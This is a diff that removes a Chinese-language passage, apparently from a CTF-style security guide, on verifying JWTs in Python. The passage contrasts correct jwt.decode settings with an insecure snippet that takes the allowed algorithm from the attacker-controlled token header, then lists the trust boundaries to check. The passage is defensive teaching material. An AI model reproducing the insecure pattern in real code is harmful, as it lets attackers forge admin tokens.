-print(payload)
-```
-
-同时要求必须包含 `exp`：
-
-```python
-payload = jwt.decode(
-    token,
-    secret,
-    algorithms=["HS256"],
-    options={
-        "require": ["exp"]
-    }
-)
-```
-
-验证签发者和接收者：
-
-```python
-payload = jwt.decode(
-    token,
-    secret,
-    algorithms=["HS256"],
-    issuer="https://auth.target",
-    audience="admin-api",
-    options={
-        "require": [
-            "exp",
-            "iat",
-            "iss",
-            "aud"
-        ]
-    }
-)
-```
-
-`algorithms` 应由服务器固定配置，不能直接使用 JWT Header 中的 `alg` 来生成允许列表。
-
-错误写法类似：
-
-```python
-header = jwt.get_unverified_header(token)
-
-payload = jwt.decode(
-    token,
-    key,
-    algorithms=[header["alg"]]
-)
-```
-
-这里的 `header["alg"]` 来自攻击者控制的 JWT，不能用它决定服务器允许的算法。
-
-JWT 题目的核心不是看到 Payload 后直接修改，而是判断服务器到底信任了什么：
-
-```txt
-是否验证 Signature
-允许哪些算法
-密钥从哪里获取
-是否信任 Header
-是否校验关键 Claim
-是否允许令牌重放
-```
-
-只要其中一个信任边界处理错误，就可能把普通用户 JWT 变成管理员 JWT。
+> 最后更新：2026-07
